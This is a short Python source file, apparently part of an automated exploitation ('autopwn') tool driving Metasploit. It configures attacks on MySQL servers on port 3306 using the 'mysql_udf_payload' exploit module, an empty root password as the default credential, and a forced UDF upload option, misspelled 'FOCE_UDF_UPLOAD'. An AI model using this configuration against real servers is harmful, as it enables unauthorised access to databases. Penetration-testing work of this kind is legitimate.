

from .base import Service

import logging

log = logging.getLogger(__name__)


class MySQL(Service):
    def __init__(self, autopwn):

        super(MySQL, self).__init__()
        self._autopwn = autopwn
        self._msfrpcd = self._autopwn._msfrpcd

        self.name = "MySQL"
        self.protocols = ["TCP"]
        self.ports = [3306]
        self.exploits = [
            "exploit/multi/mysql/mysql_udf_payload"
        ]
        self.creds = ("root", "")
        self.cves = []
        self.msfopts = {
            "RHOSTS": None,
            "USERNAME": self.creds[0],
            "FOCE_UDF_UPLOAD": True
        }
